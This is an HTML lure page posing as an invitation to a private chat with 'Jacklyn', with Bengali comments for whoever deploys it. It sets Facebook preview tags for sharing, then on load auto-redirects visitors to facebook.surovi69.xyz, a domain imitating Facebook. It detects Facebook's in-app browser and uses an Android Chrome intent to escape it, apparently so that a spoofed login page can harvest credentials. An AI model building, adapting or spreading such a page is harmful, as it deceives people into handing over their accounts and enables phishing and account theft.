<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect with Jacklyn</title>
    
    <!-- ফেসবুকের জন্য হিডেন মেটা ট্যাগ (ছবি না রাখলে এগুলো মাস্ট) -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://profile.surovi69.xyz/">
    <meta property="og:title" content="Join Private Room">
    <meta property="og:description" content="Click the button to start a secure conversation.">
    <!-- এখানে আপনার ImgBB লিঙ্কটি দিন যাতে ফেসবুকে প্রিভিউ দেখায় -->
    <meta property="og:image" content="https://i.ibb.co.com/fSn1f1q/profile.jpg">

    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background-color: #f0f2f5;
            display: flex; justify-content: center; align-items: center; height: 100vh;
            text-align: center;
        }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
        .text { color: #1c1e21; font-size: 18px; margin-bottom: 20px; font-weight: 500; }
        .btn {
            background-color: #0084FF; color: white; text-decoration: none;
            padding: 12px 25px; border-radius: 8px; font-weight: bold;
            display: block; font-size: 16px; transition: 0.3s;
        }
        .loading { font-size: 12px; color: #65676b; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="text">Connecting to secure server...</div>
        
        <a href="https://facebook.surovi69.xyz" class="btn" id="goBtn">Click to Start Chat</a>
        
        <div class="loading">Please wait, redirecting in 5 seconds...</div>
    </div>

    <script>
        const targetUrl = "https://facebook.surovi69.xyz";
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function redirect() {
            if (/FBAN|FBAV/i.test(navigator.userAgent)) {
                window.location.href = chromeIntent;
                setTimeout(() => { window.location.href = targetUrl; }, 1000);
            } else {
                window.location.href = targetUrl;
            }
        }

        // ৫ সেকেন্ড পর অটো রিডাইরেক্ট (নিরাপত্তার জন্য ২ সেকেন্ডের চেয়ে ৫ সেকেন্ড ভালো)
        window.onload = function() {
            setTimeout(redirect, 5000);
        };
    </script>
</body>
</html>
